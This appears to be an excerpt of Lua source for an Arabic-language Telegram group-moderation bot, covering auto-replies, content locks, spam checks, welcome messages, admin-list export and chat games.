DevRio:set(ARAY.."Rio:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevRio:set(ARAY.."Rio:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم حفظ الرد الجديد', 1, 'md') 
DevRio:del(ARAY.."Rio:Add:AllText"..msg.sender_user_id_)
DevRio:del(ARAY..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevRio:get(ARAY..'Rio:Lock:AllRed'..msg.chat_id_) then
if DevRio:get(ARAY.."Rio:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(ARAY.."Rio:Video:AllRed"..msg.content_.text_))
end
if DevRio:get(ARAY.."Rio:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(ARAY.."Rio:File:AllRed"..msg.content_.text_))
end
if DevRio:get(ARAY.."Rio:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(ARAY.."Rio:Voice:AllRed"..msg.content_.text_))
end
if DevRio:get(ARAY.."Rio:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(ARAY.."Rio:Audio:AllRed"..msg.content_.text_))
end
if DevRio:get(ARAY.."Rio:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(ARAY.."Rio:Photo:AllRed"..msg.content_.text_))
end
if  DevRio:get(ARAY.."Rio:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(ARAY.."Rio:Gif:AllRed"..msg.content_.text_))
end
if DevRio:get(ARAY.."Rio:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(ARAY.."Rio:Stecker:AllRed"..msg.content_.text_))
end
if DevRio:get(ARAY.."Rio:Text:AllRed"..msg.content_.text_) then
function ARAYTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevRio:get(ARAY..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(ARAY..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevRio:get(ARAY.."Rio:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
...
if Type == "keed" and not DevRio:sismember(ARAY..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
...
if Type == "mute" and not DevRio:sismember(ARAY..'Rio:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevRio:sadd(ARAY..'Rio:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
...
--     Source ARAY     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= ARAY then
floods = DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevRio:get(ARAY.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevRio:setex(ARAY.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source ARAY     --
...
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(ARAY) then
DevRio:set(ARAY..'Rio:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevRio:get(ARAY..'Rio:PinnedMsg'..msg.chat_id_)
if pin_id and DevRio:get(ARAY..'Rio:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevRio:get(ARAY..'Rio:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevRio:del(ARAY..'Rio:viewget'..msg.sender_user_id_)
else
...
if DevRio:get(ARAY..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevRio:get(ARAY..'Rio:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevRio:get(ARAY..'Rio:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevRio:get(ARAY..'Rio:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevRio:get(ARAY..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevRio:get(ARAY..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevRio:get(ARAY..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevRio:get(ARAY..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
...
if DevRio:get(ARAY..'Rio:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevRio:get(ARAY..'Rio:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if not VipMem(msg) then
if DevRio:get(ARAY..'Rio:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source ARAY     --
...
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevRio:get(ARAY..'Rio:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevRio:get(ARAY..'Rio:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevRio:get(ARAY..'Rio:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@sxj3z]'))
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end 
if DevRio:get(ARAY.."Rio:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source ARAY     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevRio:get(ARAY..'Rio:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = ARAY,offset_ = 0,limit_ = 1},function(extra,rio,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(ARAY) then 
if DevRio:sismember(ARAY..'Rio:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n↯︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n↯︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n↯︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevRio:get(ARAY.."Rio:Text:BotWelcome") then RioText = DevRio:get(ARAY.."Rio:Text:BotWelcome") else RioText = "↯︙مرحبا انا بوت اسمي "..NameBot.."\n↯︙حالة المجموعه ↫ "..BotText.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉" end 
if DevRio:get(ARAY.."Rio:Photo:BotWelcome") then RioPhoto = DevRio:get(ARAY.."Rio:Photo:BotWelcome") elseif rio.photos_[0] then RioPhoto = rio.photos_[0].sizes_[1].photo_.persistent_id_ else RioPhoto = nil end 
...
local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@sxj3z]'))
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end
--     Source ARAY     --
--        Contact         --
...
if DevRio:get(ARAY..'Rio:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source ARAY     --
...
if DevRio:get(ARAY..'Rio:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(ARAY..'Rio:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(ARAY..'Rio:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
...
if DevRio:get(ARAY..'Rio:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(ARAY..'Rio:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(ARAY..'Rio:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
...
if not DevRio:get(ARAY..'Rio:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevRio:get(ARAY..'Rio:Spam:Text'..msg.chat_id_))
end
if DevRio:get(ARAY..'Rio:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
--     Source ARAY     --
if DevRio:get(ARAY.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"↯︙تم الغاء حفظ الرابط")       
DevRio:del(ARAY.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevRio:set(ARAY.."Rio:Groups:Links"..msg.chat_id_,Link)
...
if DevRio:get('ARAYTeam:'..ARAY.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevRio:del('ARAYTeam:'..ARAY..'id:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء الامر', 1, 'md')
DevRio:del('ARAYTeam:'..ARAY.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del('ARAYTeam:'..ARAY.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevRio:get('ARAYTeam:'..ARAY..'id:user'..msg.chat_id_)  
DevRio:incrby(ARAY..'Rio:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_Rio(msg.chat_id_, msg.id_,  1, "↯︙تم اضافة "..numadded..' رساله', 1, 'md')
DevRio:del('ARAYTeam:'..ARAY..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevRio:get('ARAYTeam:'..ARAY.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevRio:del('ARAYTeam:'..ARAY..'ids:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء الامر', 1, 'md')
DevRio:del('ARAYTeam:'..ARAY.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del('ARAYTeam:'..ARAY.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevRio:get('ARAYTeam:'..ARAY..'ids:user'..msg.chat_id_)  
DevRio:incrby(ARAY..'Rio:GamesNumber'..msg.chat_id_..iduserr,numadded)  
...
if not DevRio:get(ARAY.."Rio:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if DevRio:get(ARAY.."Rio:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","↯︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevRio:get(ARAY.."Rio:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevRio:get(ARAY.."Rio:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if not DevRio:get(ARAY.."Rio:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
local List = DevRio:smembers(ARAY..'Rio:Groups') 
local BotName = (DevRio:get(ARAY.."Rio:NameBot") or 'روتانا')
local GetJson = '{"BotId": '..ARAY..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevRio:get(ARAY.."Rio:Groups:Links"..v)
Welcomes = DevRio:get(ARAY..'Rio:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
RioConstructors = DevRio:smembers(ARAY..'Rio:RioConstructor:'..v)
Constructors = DevRio:smembers(ARAY..'Rio:BasicConstructor:'..v)
BasicConstructors = DevRio:smembers(ARAY..'Rio:Constructor:'..v)
Managers = DevRio:smembers(ARAY..'Rio:Managers:'..v)
Admis = DevRio:smembers(ARAY..'Rio:Admins:'..v)
Vips = DevRio:smembers(ARAY..'Rio:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
...
GetJson = GetJson..'}}'
local File = io.open('./'..ARAY..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..ARAY..'.json', '↯︙يحتوي الملف على ↫ '..#List..' مجموعه',dl_cb, nil)
io.popen('rm -rf ./'..ARAY..'.json')
end
...
--     Source ARAY     --
if DevRio:get(ARAY.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Rio( msg.chat_id_, msg.id_, 1,"↯︙يوجد فقط ( 6 ) اختيارات\n↯︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevRio:get(ARAY.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevRio:del(ARAY.."SET:GAME"..msg.chat_id_)   
Dev_Rio( msg.chat_id_, msg.id_, 1,'↯︙*المحيبس باليد رقم* ↫ '..NUM..'\n↯︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevRio:incrby(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
...
if DevRio:get(ARAY..'DevRio4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "↯︙تم الغاء الامر")
DevRio:del(ARAY..'DevRio4'..msg.sender_user_id_)
return false  end 
DevRio:del(ARAY..'DevRio4'..msg.sender_user_id_)
...
DevRio:set(ARAY..'Rio:ChId',data.id_)
else
...
--     Source ARAY     --
if DevRio:get(ARAY.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevRio:del(ARAY.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء الامر', 1, 'md')
return false 
end 
DevRio:del(ARAY.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevRio:set(ARAY.."DevText", DevText)
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم حفظ كليشة المطور", 1, "md")
end
if DevRio:get(ARAY..'Rio:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevRio:del(ARAY..'Rio:NameBot'..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم حفظ اسم البوت ', 1, 'html')
DevRio:del(ARAY..'Rio:NameBot'..msg.sender_user_id_)
DevRio:set(ARAY..'Rio:NameBot', text)
return false 
end
--     Source ARAY     --
if text == "الرابط" then
if not DevRio:get(ARAY..'Rio:Lock:GpLinks'..msg.chat_id_) then 
if DevRio:get(ARAY.."Rio:Groups:Links"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙Group Link ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..DevRio:get(ARAY.."Rio:Groups:Links"..msg.chat_id_), 1, "html")
else 
...
--     Source ARAY     --
if text == "الرابط" then
if not DevRio:get(ARAY.."Rio:Lock:GpLinksinline"..msg.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or DevRio:get(ARAY.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local Text = '↯︙𝖫𝗂𝗇𝗄 𝖦𝗋𝗈𝗎𝗉 ↬ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n['..ta.title_..']('..linkgpp.result..')'
keyboard = {}  
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sxj3z&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else 
end 
end,nil) 
end
...
NameBot = (DevRio:get(ARAY..'Rio:NameBot') or 'روتانا')
local ARAYTeam = {' كول حبيبي ؟ اني '..NameBot..' ',' وياك القميل '..NameBot..' ',' اسمي القميل '..NameBot..' '}
DevRio2 = math.random(#ARAYTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam[DevRio2] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevRio:get(ARAY..'Rio:NameBot') or 'روتانا') 
local ARAYTeam = {"اسمي القميل "..NameBot.." "} 
DevRio2 = math.random(#ARAYTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, ARAYTeam[DevRio2] , 1, 'html') 
return false
end
if text and text == (DevRio:get(ARAY..'Rio:NameBot') or 'روتانا') then 
NameBot = (DevRio:get(ARAY..'Rio:NameBot') or 'روتانا')
...
if tonumber((DevRio:get(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1,'↯︙لم تربح اي نقطه\n↯︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_Rio(msg.chat_id_, msg.id_, 1,'↯︙عدد النقاط التي ربحتها ↫ '..(DevRio:get(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevRio:del(ARAY..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevRio:del(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم حذف جميع نقاطك', 1, 'md') end
--     Source ARAY     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) or text == '↫ سمايلات ᥀' and ChCheck(msg) then
if not DevRio:get(ARAY..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevRio2[math.random(#DevRio2)]
DevRio:set(ARAY..'Rio:GameNum'..msg.chat_id_,name)
DevRio:del(ARAY..'Rio:Games:Ids'..msg.chat_id_)
...
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
ARAYTeam = '↯︙اول واحد يدز هذا السمايل يربح ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md')
return false
end end
if text == DevRio:get(ARAY..'Rio:GameNum'..msg.chat_id_) and not DevRio:get(ARAY..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(ARAY..'Rio:Games:Ids'..msg.chat_id_) then 
ARAYTeam = '↯︙مبروك لقد ربحت في اللعبه \n↯︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md')
DevRio:incrby(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevRio:set(ARAY..'Rio:Games:Ids'..msg.chat_id_,true)
end
...
ARAYTeam = '↯︙اول واحد يرتبها يربح ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md')
return false
end end
if text == DevRio:get(ARAY..'Rio:GameNum'..msg.chat_id_) and not DevRio:get(ARAY..'Rio:Games:Ids'..msg.chat_id_) then
...
if not DevRio:get(ARAY..'Rio:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevRio:set(ARAY.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿
...
DevRio:setex(ARAY.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
...
ARAYTeam = '↯︙اول واحد يحلها يربح ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md')
return false
end end
if text == DevRio:get(ARAY..'Rio:GameNum'..msg.chat_id_) and not DevRio:get(ARAY..'Rio:Games:Ids'..msg.chat_id_) then
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(ARAY..'Rio:GameNum2'..msg.chat_id_,name)
DevRio:del(ARAY..'Rio:Games:Ids'..msg.chat_id_)
...
ARAYTeam = '↯︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md')
return false
end end
if text == DevRio:get(ARAY..'Rio:GameNum2'..msg.chat_id_) and not DevRio:get(ARAY..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(ARAY..'Rio:Games:Ids'..msg.chat_id_) then 
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(ARAY..'Rio:GameNum3'..msg.chat_id_,name)
DevRio:del(ARAY..'Rio:Games:Ids'..msg.chat_id_)
...
ARAYTeam = '↯︙ما هو عكس كلمة ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,ARAYTeam, 1, 'md')
return false
end end
if text == DevRio:get(ARAY..'Rio:GameNum3'..msg.chat_id_) and not DevRio:get(ARAY..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(ARAY..'Rio:Games:Ids'..msg.chat_id_) then 
...
DevRio2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
